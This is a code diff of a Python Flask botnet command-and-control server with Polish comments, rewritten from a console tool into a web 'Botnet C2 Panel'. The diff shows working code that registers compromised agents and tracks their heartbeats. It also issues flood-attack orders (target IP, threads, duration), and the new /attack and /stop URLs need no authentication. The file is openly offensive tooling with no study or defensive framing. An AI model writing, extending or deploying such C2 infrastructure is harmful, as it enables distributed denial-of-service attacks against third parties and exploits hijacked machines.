@@ -1,33 +1,105 @@
 import os
-import sys
-import threading
 import time
-import json
-from datetime import datetime, timedelta
-from flask import Flask, request, jsonify
+import threading
+from datetime import datetime
+from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
-# Prosty słownik w pamięci (nie potrzebuje bazy danych!)
-agents = {}  # {agent_id: {'last_seen': time, 'ip': '...', 'hostname': '...'}}
-current_attack = None  # {'target': '1.1.1.1', 'threads': 100, 'duration': 300, 'start_time': timestamp}
+# Przechowujemy agentów w pamięci (słownik)
+agents = {}  # {agent_id: {'last_seen': czas, 'ip': '1.1.1.1', ...}}
+current_attack = None  # {'target': 'ip', 'threads': 100, 'duration': 60, 'start_time': timestamp}
 
-# ============ API DLA AGENTÓW ============
+# ==================== HTML PANELU ====================
+HTML_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Botnet C2 Panel</title>
+    <style>
+        body { font-family: Arial; background: #0a0e27; color: white; }
+        .container { max-width: 1200px; margin: auto; padding: 20px; }
+        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; margin: 20px 0; }
+        .card { background: #1a1f3a; padding: 20px; border-radius: 10px; }
+        .online { color: #2ecc71; }
+        .offline { color: #e74c3c; }
+        .attacking { color: #f39c12; animation: pulse 1s infinite; }
+        table { width: 100%; background: #1a1f3a; border-radius: 10px; }
+        th { background: #2a2f4a; padding: 10px; }
+        td { padding: 10px; border-bottom: 1px solid #2a2f4a; }
+        .attack-info { background: #1a1f3a; padding: 15px; border-radius: 10px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🤖 BOTNET C2 PANEL</h1>
+        
+        <div class="stats">
+            <div class="card">
+                <h3>Wszystkie boty</h3>
+                <h2>{{ total }}</h2>
+            </div>
+            <div class="card">
+                <h3>Online (60s)</h3>
+                <h2 class="online">{{ online }}</h2>
+            </div>
+            <div class="card">
+                <h3>Atakuje</h3>
+                <h2 class="attacking">{{ attacking }}</h2>
+            </div>
+        </div>
+        
+        <div class="attack-info">
+            <h3>🔥 AKTYWNY ATAK</h3>
+            {% if attack %}
+                <p>Cel: <strong>{{ attack.target }}</strong></p>
+                <p>Rozpoczęty: {{ attack.start_time }}</p>
+                <p>Pozostało: {{ attack.remaining }}s</p>
+                <p>Boty atakujące: {{ attacking }}</p>
+            {% else %}
+                <p>Brak aktywnego ataku</p>
+            {% endif %}
+        </div>
+        
+        <h2>📋 LISTA AGENTÓW</h2>
+        <table>
+            <tr>
+                <th>ID</th>
+                <th>Hostname</th>
+                <th>IP</th>
+                <th>Status</th>
+                <th>Ostatni kontakt</th>
+            </tr>
+            {% for agent in agents %}
+            <tr>
+                <td>{{ agent.id }}</td>
+                <td>{{ agent.hostname }}</td>
+                <td>{{ agent.ip }}</td>
+                <td class="{% if agent.status == 'online' %}online{% elif agent.status == 'attacking' %}attacking{% else %}offline{% endif %}">
+                    {{ agent.status }}
+                </td>
+                <td>{{ agent.last_seen }}</td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
+</body>
+</html>
+'''
+
+# ==================== API DLA AGENTÓW ====================
 
 @app.route('/api/register', methods=['POST'])
 def register():
     """Agent się rejestruje"""
     data = request.json
-    agent_id = data['id']
-    
-    agents[agent_id] = {
+    agents[data['id']] = {
         'last_seen': time.time(),
-        'ip': data.get('ip', 'unknown'),
         'hostname': data.get('hostname', 'unknown'),
+        'ip': data.get('ip', 'unknown'),
         'platform': data.get('platform', 'unknown'),
         'attacking': False
     }
-    print(f"[+] Nowy agent: {agent_id} z {data.get('ip')}")
     return jsonify({'status': 'ok'})
 
 @app.route('/api/heartbeat/<agent_id>', methods=['POST'])
@@ -42,163 +114,95 @@ def heartbeat(agent_id):
 def get_orders(agent_id):
     """Agent pyta co ma robić"""
     if current_attack and time.time() - current_attack['start_time'] < current_attack['duration']:
-        # Atak trwa
         return jsonify({
             'target_ip': current_attack['target'],
             'threads': current_attack['threads'],
             'duration': current_attack['duration']
         })
-    else:
-        # Brak ataku lub atak się zakończył
-        return jsonify({'stop': True})
+    return jsonify({'stop': True})
 
-# ============ KONSOLA KONTROLNA ============
+# ==================== KONTROLA PRZEZ HTTP ====================
 
-def print_help():
-    """Wyświetla pomoc"""
-    print("""
-╔══════════════════════════════════════════════════════════╗
-║                     BOTNET CONSOLE                       ║
-╠══════════════════════════════════════════════════════════╣
-║ l4 <IP> <czas> <wątki>  - Rozpocznij atak L4            ║
-║                         np. l4 192.168.1.100 60 100     ║
-║                                                          ║
-║ stop                     - Zatrzymaj atak               ║
-║                                                          ║
-║ list                     - Pokaż aktywnych agentów       ║
-║                                                          ║
-║ stats                    - Pokaż statystyki             ║
-║                                                          ║
-║ help                     - Ta pomoc                     ║
-║                                                          ║
-║ exit                     - Wyjście                      ║
-╚══════════════════════════════════════════════════════════╝
-""")
-
-def print_agents():
-    """Wyświetla listę agentów"""
+@app.route('/')
+def index():
+    """Główny panel"""
     now = time.time()
-    online = []
-    offline = []
+    online_count = 0
+    attacking_count = 0
+    agents_list = []
     
     for aid, data in agents.items():
-        if now - data['last_seen'] < 60:  # online w ostatniej minucie
-            online.append(aid)
-        else:
-            offline.append(aid)
+        status = 'offline'
+        if now - data['last_seen'] < 60:
+            status = 'online'
+            online_count += 1
+            if data.get('attacking'):
+                status = 'attacking'
+                attacking_count += 1
+        
+        agents_list.append({
+            'id': aid[:8],  # skrócone ID
+            'hostname': data['hostname'],
+            'ip': data['ip'],
+            'status': status,
+            'last_seen': datetime.fromtimestamp(data['last_seen']).strftime('%H:%M:%S')
+        })
     
-    print(f"\n🤖 ONLINE ({len(online)}):")
-    for aid in online[:10]:  # pokaż max 10
-        agent = agents[aid]
-        status = "🔥 ATAKUJE" if agent['attacking'] else "💤"
-        print(f"  [{aid}] {agent['hostname']} ({agent['ip']}) - {status}")
+    # Info o ataku
+    attack_info = None
+    if current_attack:
+        elapsed = time.time() - current_attack['start_time']
+        if elapsed < current_attack['duration']:
+            attack_info = {
+                'target': current_attack['target'],
+                'start_time': datetime.fromtimestamp(current_attack['start_time']).strftime('%H:%M:%S'),
+                'remaining': int(current_attack['duration'] - elapsed)
+            }
     
-    if offline:
-        print(f"\n💀 OFFLINE ({len(offline)}):")
-        for aid in offline[:5]:
-            print(f"  [{aid}] ostatnio: {int(now - agents[aid]['last_seen'])}s temu")
+    return render_template_string(
+        HTML_TEMPLATE,
+        total=len(agents),
+        online=online_count,
+        attacking=attacking_count,
+        agents=agents_list,
+        attack=attack_info
+    )
 
-def print_stats():
-    """Wyświetla statystyki"""
-    now = time.time()
-    total = len(agents)
-    online = sum(1 for a in agents.values() if now - a['last_seen'] < 60)
-    attacking = sum(1 for a in agents.values() if a.get('attacking', False))
-    
-    print(f"""
-╔════════════════════════════════════╗
-║           STATYSTYKI               ║
-╠════════════════════════════════════╣
-║  Wszystkie boty: {total:<4}                      ║
-║  Online:         {online:<4}                      ║
-║  Atakuje:        {attacking:<4}                      ║
-║  Moc:            {online * 100} Mbps              ║
-╚════════════════════════════════════╝
-""")
-    
-    if current_attack and time.time() - current_attack['start_time'] < current_attack['duration']:
-        remaining = current_attack['duration'] - (time.time() - current_attack['start_time'])
-        print(f"🔥 ATAK TRWA: {current_attack['target']} | pozostało: {int(remaining)}s")
-
-def console():
-    """Główna pętla konsoli"""
-    print("\n" + "="*50)
-    print("           BOTNET C2 - KONSOLA ZARZĄDZANIA")
-    print("="*50)
-    print_help()
-    
+@app.route('/attack')
+def start_attack():
+    """Rozpocznij atak (przez URL)"""
     global current_attack
     
-    while True:
-        try:
-            cmd = input("\nC2> ").strip().lower()
-            
-            if cmd == 'help':
-                print_help()
-            
-            elif cmd == 'list':
-                print_agents()
-            
-            elif cmd == 'stats':
-                print_stats()
-            
-            elif cmd == 'stop':
-                current_attack = None
-                print("[✓] Atak zatrzymany")
-            
-            elif cmd.startswith('l4 '):
-                parts = cmd.split()
-                if len(parts) == 4:
-                    try:
-                        ip = parts[1]
-                        duration = int(parts[2])
-                        threads = int(parts[3])
-                        
-                        current_attack = {
-                            'target': ip,
-                            'duration': duration,
-                            'threads': threads,
-                            'start_time': time.time()
-                        }
-                        
-                        print(f"[✓] Atak rozpoczęty!")
-                        print(f"    Cel: {ip}")
-                        print(f"    Czas: {duration}s")
-                        print(f"    Wątki: {threads}")
-                        print(f"    Boty online: {sum(1 for a in agents.values() if time.time() - a['last_seen'] < 60)}")
-                        
-                    except ValueError:
-                        print("[!] Błąd: czas i wątki muszą być liczbami")
-                else:
-                    print("[!] Użycie: l4 <IP> <czas> <wątki>")
-            
-            elif cmd == 'exit':
-                print("Do widzenia!")
-                break
-            
-            elif cmd:
-                print(f"[!] Nieznana komenda: {cmd}")
-                
-        except KeyboardInterrupt:
-            print("\nDo widzenia!")
-            break
-        except Exception as e:
-            print(f"[!] Błąd: {e}")
+    target = request.args.get('target')
+    duration = int(request.args.get('duration', 60))
+    threads = int(request.args.get('threads', 100))
+    
+    if not target:
+        return "Błąd: podaj target np. ?target=1.1.1.1"
+    
+    current_attack = {
+        'target': target,
+        'duration': duration,
+        'threads': threads,
+        'start_time': time.time()
+    }
+    
+    return f"""
+    <h2>✅ Atak rozpoczęty!</h2>
+    <p>Cel: {target}</p>
+    <p>Czas: {duration}s</p>
+    <p>Wątki: {threads}</p>
+    <p>Boty online: {sum(1 for a in agents.values() if time.time() - a['last_seen'] < 60)}</p>
+    <p><a href='/'>Wróć do panelu</a></p>
+    """
 
-# ============ URUCHOMIENIE ============
-
-def run_flask():
-    """Uruchamia serwer Flask w tle"""
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+@app.route('/stop')
+def stop_attack():
+    """Zatrzymaj atak"""
+    global current_attack
+    current_attack = None
+    return "Atak zatrzymany. <a href='/'>Wróć</a>"
 
 if __name__ == '__main__':
-    # Uruchom Flask w osobnym wątku
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    
-    print("[✓] Serwer API uruchomiony")
-    print("[✓] Czekam na agentów...")
-    
-    # Uruchom konsolę
-    console()
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
